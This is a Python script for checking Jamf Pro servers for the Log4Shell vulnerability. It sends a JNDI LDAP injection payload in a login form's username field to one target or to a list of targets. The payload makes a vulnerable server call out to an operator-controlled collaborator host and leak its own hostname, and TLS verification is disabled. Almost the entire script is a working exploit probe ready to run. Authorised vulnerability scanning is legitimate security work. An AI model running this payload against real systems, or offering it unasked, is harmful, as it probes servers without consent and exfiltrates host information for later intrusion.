#!/usr/bin/env python
#
# 
#
# Jamf Pro Log4J Vuln Check
#
# By @Random-Robbie
# 
#

import requests
import sys
from random import randint
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-c", "--collab", default="",required=True, help="Collaborator URL")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
urls = args.file
collaburl = args.collab


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy
	
	

            
           

def test_url(url,collaburl):
	r1 = randint(1, 12312)
	paramsPost = {"password":"","username":"\x24{jndi:ldap://h\x24{hostName}."+str(r1)+"."+collaburl+"/test}"}
	headers = {"Origin":""+url+"","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0","Referer":""+url+"/","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"same-origin","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"navigate","Te":"trailers","Upgrade-Insecure-Requests":"1","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
	response = session.post(""+url+"", data=paramsPost, headers=headers, verify=False)
	print("Check Burp Collab For any Response")
			
			

				


if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					test_url(url,collaburl)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	print("Testing "+url+" with Collab url "+collaburl+"")
	test_url(url,collaburl)
